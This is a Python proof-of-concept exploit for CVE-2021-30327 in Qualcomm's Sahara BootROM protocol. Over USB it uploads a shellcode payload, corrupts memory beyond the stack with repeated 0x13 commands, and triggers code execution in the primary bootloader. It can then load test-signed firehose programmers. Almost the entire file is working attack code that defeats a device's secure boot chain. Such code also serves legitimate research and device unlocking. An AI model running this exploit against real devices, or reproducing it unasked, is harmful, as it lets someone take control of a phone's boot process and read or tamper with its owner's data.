import shutil
import usb.core
import usb.util
import usb.backend.libusb1
import libusb
import argparse
import struct
import sys
import os
import coloredlogs
import logging
import re
from time import sleep
from struct import pack
from soc_data import SOC_DATA

logger  = logging.getLogger(__name__)
# Enable to see TX/RX logs
verbose = False

EDL_VID = 0x05C6
EDL_PID = 0x9008
 
USB_TIMEOUT_MS = 1500
USB_READ_SIZE  = 0x1000

class EDLDevice:
    def __init__(self):
        self.dev    = None
        self.ep_in  = None
        self.ep_out = None
 
    def connect(self) -> bool:
        logger.info("Searching for Qualcomm device in Sahara state")
 
        backend = usb.backend.libusb1.get_backend()
        if backend is None:
            logger.error(
                "libusb not found."
                "If you're on Windows, please install Zadig drivers"
            )
            return False
 
        self.dev = usb.core.find(idVendor=EDL_VID, idProduct=EDL_PID, backend=backend)
        if self.dev is None:
            logger.error("No device in Sahara.")
            return False
 
        logger.info("Found device!")
 
        # detach kernel driver on linux
        if sys.platform != "win32":
            try:
                if self.dev.is_kernel_driver_active(0):
                    logger.debug("Detaching kernel driver")
                    self.dev.detach_kernel_driver(0)
            except usb.core.USBError as e:
                logger.warning("Could not detach kernel driver: %s", e)
 
        self.dev.set_configuration()
 
        cfg  = self.dev.get_active_configuration()
        intf = cfg[(0, 0)]
 
        self.ep_out = usb.util.find_descriptor(
            intf,
            custom_match=lambda e:
                usb.util.endpoint_direction(e.bEndpointAddress) == usb.util.ENDPOINT_OUT
        )
        self.ep_in = usb.util.find_descriptor(
            intf,
            custom_match=lambda e:
                usb.util.endpoint_direction(e.bEndpointAddress) == usb.util.ENDPOINT_IN
        )
 
        logger.info("Connected to device")
        return True
 
    def write(self, data: bytes) -> int:
        if verbose == True:
            logger.debug(f"TX (0x{len(data):x}): {data.hex()}")
        return self.ep_out.write(data, timeout=USB_TIMEOUT_MS)  
 
    def read(self, size: int = USB_READ_SIZE) -> bytes:
        data = bytes(self.ep_in.read(size, timeout=USB_TIMEOUT_MS))
        if verbose == True:
            logger.debug(f"RX (0x{len(data):x}): {data.hex()}")
        return data

    def close(self):
        if self.dev:
            usb.util.dispose_resources(self.dev)
            self.dev = None
            logger.info("Device released.")

def send_hello_resp(edl, mode, ver_min, max_pkt, version):
    cmd = 0x2
    length = 0x30
    # 1-6 placeholders? referenced off of bkerler's code
    resp_packet = pack("<IIIIIIIIIIII", cmd, length, version, ver_min, 0x0, 0x3, 1, 2, 3, 4, 5, 6)
    edl.write(resp_packet)

def send_hello_resp_cust_mode(edl, mode, ver_min, switch_mode, version):
    cmd = 0x2
    length = 0x30
    # basically a hello response with mode
    resp_packet = pack("<IIIIIIIIIIII", cmd, length, version, ver_min, 0x0, switch_mode, 1, 2, 3, 4, 5, 6)
    edl.write(resp_packet)

def upload_loader(edl, path: str):
    with open(path, "rb") as f:
        programmer = f.read()

    while True:
        data = edl.read(size=0x30)

        cmd = struct.unpack_from("<I", data, 0)[0]

        if cmd == 0x3:
            _, _, image_id, data_offset, data_len = \
                struct.unpack_from("<IIIII", data, 0)

        elif cmd == 0x12:
            image_id = struct.unpack_from("<I", data, 8)[0]
            data_offset = struct.unpack_from("<Q", data, 16)[0]
            data_len = struct.unpack_from("<Q", data, 24)[0]

        elif cmd == 0x4:
            _, _, image_id, status = \
                struct.unpack_from("<IIII", data, 0)

            if status == 0:
                logger.info("Transfer complete, telling PBL it's done")

                # SAHARA_DONE_REQ
                edl.write(pack("<II", 0x5, 0x8))
                rsp = edl.read(size=0x30)
                done_cmd = struct.unpack_from("<I", rsp, 0)[0]
                if done_cmd == 0x6:
                    logger.info("Loader uploaded successfully")
                    return True

                logger.error(f"Expected SAHARA_DONE_RSP, got 0x{done_cmd:x}")
                return False

            logger.error(f"Transfer failed, status=0x{status:x}")
            return False

        else:
            logger.error(f"Unexpected cmd during upload: 0x{cmd:x}")
            return False
        
        temp_prog = programmer

        end = data_offset + data_len

        if end > len(temp_prog):
            temp_prog += b"\xff" * (end - len(temp_prog))

        chunk = temp_prog[data_offset:end]

        edl.write(chunk)

def upload_exploit_payload(edl, path: str):
    with open(path, "rb") as f:
        payload = f.read()

    # we split bulk transfers to 200 byte chunks, seems to be the safest option..
    CHUNK_SIZE = 0x200

    while True:
        pkt_req = edl.read(size=0x20)
        offset, = struct.unpack_from("<Q", pkt_req, 0x10)
        size, = struct.unpack_from("<Q", pkt_req, 0x18)

        # i'm not really sure if pbl will copy shellcode this large
        if offset == 0x2000:
            break        

        logger.warning(f"Sending payload segment, offset=0x{offset:x} size=0x{size:x}")

        raw = payload[offset:offset + size]
        data = raw.ljust(size, b'\x00')

        sent = 0
        while sent < len(data):
            chunk = data[sent:sent + CHUNK_SIZE]
            edl.write(chunk)
            sent += len(chunk)

def main():
    coloredlogs.install(
        level="DEBUG",
        fmt="%(asctime)s %(message)s",
        level_styles={
            'debug': {'color': 'magenta'},
            'info': {'color': 'green'},
            'warning': {'color': 'white', 'bold': True},
            'error': {'color': 'yellow', 'bold': True},
            'critical': {'color': 'red', 'bold': True},
        },
        field_styles={
            'asctime': {'color': 'blue'},
            'levelname': {'bold': True},
        }
    )

    logger.debug(r"""

88                                                                   
88                       ,d                                          
88                       88                                          
88   ,d8   ,adPPYYba,  MM88MMM  ,adPPYYba,  8b,dPPYba,   ,adPPYYba,  
88 ,a8"    ""     `Y8    88     ""     `Y8  88P'   `"8a  ""     `Y8  
8888[      ,adPPPPP88    88     ,adPPPPP88  88       88  ,adPPPPP88  
88`"Yba,   88,    ,88    88,    88,    ,88  88       88  88,    ,88  
88   `Y8a  `"8bbdP"Y8    "Y888  `"8bbdP"Y8  88       88  `"8bbdP"Y8  
                                                                     
                                    
    """)

    print("Qualcomm BootROM Exploit - CVE-2021-30327")
    print("Version 1.0 (c) 2025 Daniel224455 <danalexgro@gmail.com> - github.com/Daniel224455/katana")
    parser = argparse.ArgumentParser(description="A PoC for the CVE-2021-30327 vulnerability in Qualcomm Sahara")
    parser.add_argument('-s', '--soc', type=str, help="SoC model", required=True)
    parser.add_argument('-e', '--exploit', type=str, help="Exploit PBL (CVE-2021-30327) with a payload", required=True)
    parser.add_argument('-f', '--firehose', type=str, help="DevPrg image in case the payload reinitializes Sahara", required=False)

    args = parser.parse_args()
    soc = args.soc

    if not soc in SOC_DATA:
        logger.critical(f"Selected SoC has no entry in soc_data.py!")
        exit()
    else:
        logger.critical(f"Selected SoC: {soc}")    

    edl = EDLDevice() 
    if not edl.connect():
        raise SystemExit(1)
    
    # Read Sahara hello packet
    data = edl.read(size=0x30)

    cmd, length = struct.unpack_from('<II', data, 0)

    if cmd == 0x1:  # sahara_state_wait_hello_resp
        cmd, length, ver, ver_min, max_pkt, mode = struct.unpack_from('<IIIIII', data, 0)
        logger.info(f"Sahara version {ver}")
        if mode == 0x0:
            logger.info(f"Device is in PBL Sahara")
        else:
            logger.info(f"Unknown mode, please reboot into PBL Sahara")
            exit()  

        # attempting to detect the soc will result in a buffer too small 
        # error while sending the payload. 

        if args.exploit:  
            logger.info("Starting exploit")

            send_hello_resp_cust_mode(edl, mode, ver_min, 0x1, ver)

            with open(args.exploit, "rb") as f:
                check_payload = f.read()
            coyote_payload = 1 if b"Coyote-Napali" in check_payload else 0  

            if coyote_payload == 1:
                logger.info("Coyote payload detected")

            upload_exploit_payload(edl, args.exploit)

            logger.info("Transferred payload, now trying to get our shellcode to execute!")

            edl.write(b"")
            logger.debug("Transferring nulls to satisfy PBL")
            for _ in range(SOC_DATA[soc]["send_null_cnt"]):
                edl.write(b"\x00" * 0x200)
            edl.write(b"")

            # we expect 0x4 but i'm too lazy to add a check lmao
            edl.read(size=0x10)

            # corrupt memory beyond the stack
            for _ in range(SOC_DATA[soc]["reset_cnt"]):
                # 0x13 calls into boot_sahara_entry
                # each iteration that goes back into boot_sahara_process_packets
                # decrements the SP by 0x60 bytes (on NapaliV2)
                edl.write(b"\x13")
                edl.read(size=0x30)

            logger.warning("Executing shellcode")    
            edl.write(SOC_DATA[soc]["finish_payload_rx_stage1"])
            edl.write(SOC_DATA[soc]["finish_payload_rx_stage2"])
            logger.warning("Your BootROM is now pwned!")  
            sleep(0.5)

            if coyote_payload == 1:
                logger.warning("You can now run testsigned firehoses") 
                logger.info("Releasing USB after reinit by payload") 
                edl.close()
                logger.info("Reconnecting") 
                edl.connect()
                logger.info("Checking if sahara was reinitialized correctly") 
                # reusing stuff from the initial hello pkt seems to be ok
                edl.read(size=0x30)    
                send_hello_resp_cust_mode(edl, mode, ver_min, 0x1, ver)
                upload_loader(edl, args.firehose)

    elif cmd == 0x4: # pbl sends this if you sent an ELF and didn't do anything after
        logger.info(f"Reboot your device. SAHARA_END_TRANSFER")    
    else:
        logger.error(f"Unexpected Sahara command")        

    edl.close()

if __name__ == "__main__":
    main()